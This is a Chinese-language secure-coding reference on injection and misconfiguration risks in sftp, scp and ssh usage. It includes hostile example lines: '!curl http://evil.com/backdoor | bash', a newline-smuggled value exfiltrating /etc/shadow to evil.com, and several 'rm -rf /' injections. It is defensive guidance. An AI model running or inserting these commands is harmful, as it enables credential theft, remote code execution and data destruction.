# sftp / scp / ssh 命令安全风险

## 涉及的安全问题
- 命令注入（参数注入）
- 上传下载（任意文件上传/下载、SSRF）
- 跨目录读写（远程/本地路径可控）
- 操作任意文件（本地文件上传 = 读取任意文件）
- 完整性校验缺失（主机验证绕过）

## 高危模式

### 完整性校验缺失 — 主机验证绕过
```bash
# 禁用 SSH 主机验证（MITM 攻击风险）
ssh -o StrictHostKeyChecking=no "$HOST" "$CMD"
scp -o StrictHostKeyChecking=no "$FILE" "$HOST:$PATH"
sftp -o StrictHostKeyChecking=no "$HOST"

# 忽略 known_hosts
ssh -o UserKnownHostsFile=/dev/null "$HOST" "$CMD"
scp -o UserKnownHostsFile=/dev/null "$FILE" "$HOST"
sftp -o UserKnownHostsFile=/dev/null "$HOST"

# 组合使用（完全禁用验证）
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$HOST" "$CMD"
```

### 命令注入 — SFTP !command 本地命令执行
```bash
# SFTP 支持 ! 前缀执行本地 shell 命令
# 这是 SFTP 特有的命令注入向量

# !command 直接执行本地命令
sftp "$HOST" <<EOF
!whoami
!cat /etc/shadow
!rm -rf /
EOF

# ! 单独使用启动本地 shell
sftp "$HOST" <<EOF
!
EOF
# 进入本地 shell，可执行任意命令

# !command 带参数
sftp "$HOST" <<EOF
!curl http://evil.com/backdoor | bash
!wget http://evil.com/malware -O /tmp/malware
EOF

# 通过变量注入 !command
sftp "$HOST" <<EOF
get $REMOTE_FILE
EOF
# REMOTE_FILE = "/etc/passwd\n!rm -rf /"
# 换行符后注入 !command

# 批处理文件中注入
echo "get $USER_PATH" > /tmp/sftp_batch
sftp -b /tmp/sftp_batch "$HOST"
# USER_PATH = "/etc/shadow\n!curl evil.com/exfil?data=$(cat /etc/shadow | base64)"
# 通过 !command 执行数据外泄

# lcd 命令配合 !command
sftp "$HOST" <<EOF
lcd $USER_DIR
!ls -la
EOF
# USER_DIR 可控，先切换到敏感目录再执行命令

# 链式注入
sftp "$HOST" <<EOF
get $FILE
!chmod +x /tmp/backdoor
!/tmp/backdoor
EOF
# 下载文件后通过 !command 执行
```

### 上传下载 — SFTP 批处理注入
```bash
# SFTP 批处理文件注入（不含 !command）
echo "get $USER_PATH" > /tmp/sftp_batch
sftp -b /tmp/sftp_batch "$HOST"
# USER_PATH = "/etc/shadow" → 下载任意文件

# SFTP here-document 注入（不含 !command）
sftp "$USER@$HOST" <<EOF
get $REMOTE_PATH /local/data/
put /local/upload/$FILE $REMOTE_DIR/
EOF
# REMOTE_PATH 可控 → 下载远程任意文件
# FILE 可控 → 上传本地任意文件
```

### 上传下载 — 凭证暴露
```bash
# 密码在命令行（ps aux 可见）
sshpass -p "$PASSWORD" sftp "$HOST"
sshpass -p "$PASSWORD" scp "$FILE" "$HOST"
sshpass -p "$PASSWORD" ssh "$HOST" "$CMD"
```

### 跨目录读写 — 路径可控
```bash
# SCP 用户可控路径
scp "$USER_FILE" "$USER_REMOTE"
scp -r "$USER_DIR" "$HOST:$REMOTE_PATH"
# USER_FILE 可控 → 上传任意本地文件
# REMOTE_PATH 可控 → 写入远程任意位置

# SSH 远程命令中路径可控
ssh "$HOST" "cat $REMOTE_FILE"
ssh "$HOST" "rm -rf $REMOTE_PATH"
```

### 命令注入 — SSH 远程命令
```bash
ssh "$HOST" "$USER_CMD"
# USER_CMD = "; rm -rf /"

ssh "$USER_HOST" "ls"
# USER_HOST = "evil.com; rm -rf /"
```
